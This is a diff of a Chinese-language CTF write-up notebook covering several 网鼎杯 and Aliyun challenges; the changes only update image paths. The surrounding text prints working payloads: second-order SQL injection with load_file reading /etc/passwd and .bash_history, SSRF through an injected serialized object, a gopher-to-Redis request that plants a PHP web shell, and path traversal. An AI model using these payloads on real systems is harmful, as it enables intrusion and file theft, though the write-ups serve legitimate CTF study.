@@ -1,14 +1,14 @@
 ## [网鼎杯 2018]Comment
 进来是一个留言板，需要登录才能写，要爆破后三位密码。
 我们先扫目录：
-![[file-20251224142401994.png]]
+![[assets/Day 6/file-20251224142401994.png]]
 
 发现有很多git文件，这里学习了一下githacker使用
 ```powershell
   githacker --url http://2b661b6a-7be0-408c-84e4-0aa48b856bee.node4.buuoj.cn:81/ --folder ./result
 ```
 可以下载下来git仓库，还有一份源码：
-![[file-20251224142342607.png]]
+![[assets/Day 6/file-20251224142342607.png]]
 ```php
 <?php
 include "mysql.php";
@@ -44,7 +44,7 @@ PS D:\webtool\GitHacker\result\6bc57b1d5399283fce7fbb0c289a505f> git log --reflo
 ```powershell
 PS D:\webtool\GitHacker\result\6bc57b1d5399283fce7fbb0c289a505f> git reset --hard e5b2a2443c2b6d395d06960123142bc91123148c
 ```
-![[file-20251224142721761.png]]
+![[assets/Day 6/file-20251224142721761.png]]
 具体怎么判断的哪个是完整的我也不清楚，大概就是看`refs/stash 标记`
 然后我们就得到了完整的源代码了：
 
@@ -97,7 +97,7 @@ else{
 ```
 很明显发现一个`wirte`模式，执行`insert`命令，`comment`模式执行查询，这是一个二次注入的特征。
 首先我们尝试爆破一个密码，这里猜测是整数：
-![[file-20251224161904911.png]]
+![[assets/Day 6/file-20251224161904911.png]]
 注意到只有pauload为`666`时，响应大小最大且存在302跳转，那这应该就是正确密码了。
 下面进行二次注入，这里查询得到的是`category`,然后又被原样写入，所以对该字段注入
 输入流程：
@@ -115,36 +115,36 @@ content=*/#&bo_id=4
 因为把上面我们的输入取出来了，有注入进去，此时就连原本存在的`addslashes()`转义都消失了。
 3. 访问`/comment.php?id=4`
 查询结果，此时会查到注入的结果，注意每次注入要换一个id，上一步也一样。
-![[file-20251224171541840.png]]
+![[assets/Day 6/file-20251224171541840.png]]
 这里用到了`load_file`是因为常规的注入没有找到flag，所以试试读文件。
 注意到web目录：
-![[file-20251224171722142.png]]
+![[assets/Day 6/file-20251224171722142.png]]
 是在`/home`下面，看一下web目录的操作记录：
 ```http
 title=12&category=12',content=(select(load_file("/home/www/.bash_history"))),/*&content=123
 ```
-![[file-20251224172022201.png]]
+![[assets/Day 6/file-20251224172022201.png]]
 可以看到当前项由`html.zip`在原本`/tmp`目录下解压再复制到`/var/www`，并且记录了关于项目`html`文件结构的`.DS_Store`在`/tmp`目录中仍存在一份，去读取这个文件了解下项目结构。
-![[file-20251224172445156.png]]
+![[assets/Day 6/file-20251224172445156.png]]
 都是不可见字符，我们想到可以用`hex()`函数读取16进制编码出来
 ```http
 title=12&category=12',content=(select(hex(load_file("/tmp/html/.DS_Store")))),/*&content=123
 ```
 得到的16进制转成字符串，可以用在线网站
 https://www.sojson.com/hexadecimal.html
-![[file-20251224173111303.png]]
+![[assets/Day 6/file-20251224173111303.png]]
 得到了flag的文件路径，`flag_8946e1ff1ee3e40f.php`
 ```http
 title=12&category=12',content=(select(load_file("/var/www/html/flag_8946e1ff1ee3e40f.php"))),/*&content=123
 ```
-![[file-20251224173652831.png]]
+![[assets/Day 6/file-20251224173652831.png]]
 
 # [网鼎杯 2018]Fakebook
 
 dirsearch扫一波：
-![[file-20251224175237686.png]]
+![[assets/Day 6/file-20251224175237686.png]]
 有`robots.txt`去看看。
-![[file-20251224175355330.png]]
+![[assets/Day 6/file-20251224175355330.png]]
 备份文件，下下来看看：
 ```php
 <?php
@@ -194,8 +194,8 @@ class UserInfo
 ```
 看到`curl_exec`那应该就是打ssrf
 随便测试、一下，注意到添加blog之后，点击是可以看内容的
-![[file-20251224180129633.png]]我们换成www.baidu.com，访问，确实得到了网页html代码，不过是base64形式：
-![[file-20251224181442629.png]]
+![[assets/Day 6/file-20251224180129633.png]]我们换成www.baidu.com，访问，确实得到了网页html代码，不过是base64形式：
+![[assets/Day 6/file-20251224181442629.png]]
 这里又想测一下sql注入，测一下，发现居然也存在数字型sql，并且过滤了union select连写，我们试一下注释符，可以绕过
 ## 方法一：
 然后直接load_file读文件
@@ -211,7 +211,7 @@ class UserInfo
 1~admin~c7ad44cbad762a5da0a452f9e854fdc1e0e7a52a38015f23f3eab1d80b931dd472634dfac71cd34ebc35d16ab7fb8a90c81f975113d6c7538dc69dd8de9077ec~O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:13;s:4:"blog";s:8:"blog.com";},2~admin1~c7ad44cbad762a5da0a452f9e854fdc1e0e7a52a38015f23f3eab1d80b931dd472634dfac71cd34ebc35d16ab7fb8a90c81f975113d6c7538dc69dd8de9077ec~O:8:"UserInfo":3:{s:4:"name";s:6:"admin1";s:3:"age";i:13;s:4:"blog";s:9:"baidu.com";},3~admin2~c7ad44cbad762a5da0a452f9e854fdc1e0e7a52a38015f23f3eab1d80b931dd472634dfac71cd34ebc35d16ab7fb8a90c81f975113d6c7538dc69dd8de9077ec~O:8:"UserInfo":3:{s:4:"name";s:6:"admin2";s:3:"age";i:13;s:4:"blog";s:13:"www.baidu.com";},4~admin4~c7ad44cbad762a5da0a452f9e854fdc1e0e7a52a38015f23f3eab1d80b931dd472634dfac71cd34ebc35d16ab7fb8a90c81f975113d6c7538dc69dd8de9077ec~O:8:"UserInfo":3:{s:4:"name";s:6:"admin4";s:3:"age";i:13;s:4:"blog";s:26:"7f000001.c0a80001.rbndr.us";},5~admin5~c7ad44cbad762a5da0a452f9e854fdc1e0e7a52a38015f23f3eab1d80b931dd472634dfac71cd34ebc35d16ab7fb8a90c81f975113d6c7538dc69dd8de9077ec~O:8:"UserInfo":3:{s:4:"name";s:6:"admin5";s:3:"age";i:13;s:4:"blog";s:21:"http://local.test.com";}
 ```
 得到这个，就发现`data`字段是序列化存储的；报错也有反序列化失败，那想会不会存在反序列化漏洞
-![[file-20251224183534546.png]]
+![[assets/Day 6/file-20251224183534546.png]]
 我们再联想一下前面发现疑似SSRF的，它本身不能填file协议，那如果我们反序列化更改填入的blog，换成其他协呢？
 exp:
 ```php
@@ -230,7 +230,7 @@ echo serialize($userInfo);
 ```http
 ?no=0 unioN/**/ select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:1:"1";s:3:"age";i:12;s:4:"blog";s:18:"file:///etc/passwd";}' #
 ```
-![[file-20251224184545970.png]]
+![[assets/Day 6/file-20251224184545970.png]]
 看到常规读到。这里这个sql注入+php反序列化+ssrf还是很有意思
 # [网鼎杯 2020 玄武组]SSRFMe
 ```php
@@ -323,9 +323,9 @@ url编码两次用gopher协议发包
 ```http
 ?url=gopher://0.0.0.0:6379/_auth%2520root%250Aconfig%2520set%2520dir%2520%252Fvar%252Fwww%252Fhtml%252F%250Aconfig%2520set%2520dbfilename%2520shell.php%250Aset%2520margin%2520%2522%253C%253Fphp%2520system(%2524_POST%255B%27cmd%27%255D)%253B%253F%253E%2522%250Asave%250Aquit
 ```
-![[file-20251224202619629.png]]
+![[assets/Day 6/file-20251224202619629.png]]
 最后命令执行
-![[file-20251224202452764.png]]
+![[assets/Day 6/file-20251224202452764.png]]
 
 # [阿里云CTF2025]ezoj
 这题不算复现吧，就算是学习了，想复现然后搞环境什么的搞了很久还是不行，应该是和题目环境有点差别，怎么都打不出来。但是理解了一下怎么做吧。（最后还是给我搞出来了。。。。）
@@ -567,7 +567,7 @@ for i in range(0,50):
 `Wrang Answer: pass(0/10)'
 这里就是先绕过钩子读取到flag，然后一个个对比，如果对上了一个字符就`print(2)`，
 这样进行布尔盲注。读取到flag
-![[file-20251224224241544.png]]
+![[assets/Day 6/file-20251224224241544.png]]
 真不容易这里第一个A被打出来，因为脚本字符集不全，可以改进一下。
 # [网鼎杯 2020 半决赛]faka
 ## 一
@@ -610,23 +610,23 @@ public function pass()
 尝试了下，两个路径都可以直接访问。第一个方法是修改用户密码，可以看到代码中验证比较多，没有什么可以利用点；info这个方法直接调用父类的方法，没有什么比对验证，也许可以利用？
 ```
 试一下，可以直接添加，尝试登录
-![[file-20251224233354157.png]]
+![[assets/Day 6/file-20251224233354157.png]]
 功能比较少，点击内容管理时，提示没有权限，接下来需要越权。  
 审计了一圈下来，用户信息都存在session当中，没办法直接在页面交互中改权限。  
 比对数据库发现，自己注册的用户和admin用户的authorize值不一样。
-![[file-20251224233515923.png]]
+![[assets/Day 6/file-20251224233515923.png]]
 而且自己新增的用户authorize值为null。能不能在刚才修改用户的资料里这个页面直接改？
-![[file-20251224234027019.png]]
+![[assets/Day 6/file-20251224234027019.png]]
 我们成功添加了超级管理员账户
-![[file-20251224234152730.png]]
+![[assets/Day 6/file-20251224234152730.png]]
 最后找到一个文件下载
-![[file-20251224234428771.png]]
+![[assets/Day 6/file-20251224234428771.png]]
 payload：
 ```http
 http://76d7f130-51bd-4a43-9abb-e65d29842a68.node5.buuoj.cn/index.php/manage/Backup/downloadBak?file=%E2%80%A6/%E2%80%A6/%E2%80%A6/%E2%80%A6/etc/passwd
 ```
 但是不知道为什么这里报错了。。。
-![[file-20251224234617535.png]]
+![[assets/Day 6/file-20251224234617535.png]]
 ## 二、
 
 这是另外一个师傅的wp，我还得好好看看
@@ -635,7 +635,7 @@ http://76d7f130-51bd-4a43-9abb-e65d29842a68.node5.buuoj.cn/index.php/manage/Back
 
 基于thinkphp写的，也是看到了wp，漏洞点在`application/admin/controller/Plugs.php`
 
-![[file-20251224231109899.png]]
+![[assets/Day 6/file-20251224231109899.png]]
 
 首先通过`$this->request->file()`来获取上传的文件信息，`$this->request->file()`是thinkphp实现的用来获取上传文件信息的函数，详细代码如下：
 
@@ -765,7 +765,7 @@ http://76d7f130-51bd-4a43-9abb-e65d29842a68.node5.buuoj.cn/index.php/manage/Back
 
 前面是对文件的一些检测，在`$this->check()`函数中会调用`checkImg()`函数来检查上传的文件是否真的为图片，
 
-![[file-20251224231347546.png]]
+![[assets/Day 6/file-20251224231347546.png]]
 
 通过检测后会进入`buildSaveName($savename)`，跟进
 
@@ -819,5 +819,5 @@ echo md5("4124bc0a9335c27f/086f24ba207a.php.png");
 bf9b89e7c8f5f1159d8bd7aaaa9c795d
 ```
 
-![[file-20251224231654990.png]]
-![[file-20251224231703081.png]]
+![[assets/Day 6/file-20251224231654990.png]]
+![[assets/Day 6/file-20251224231703081.png]]
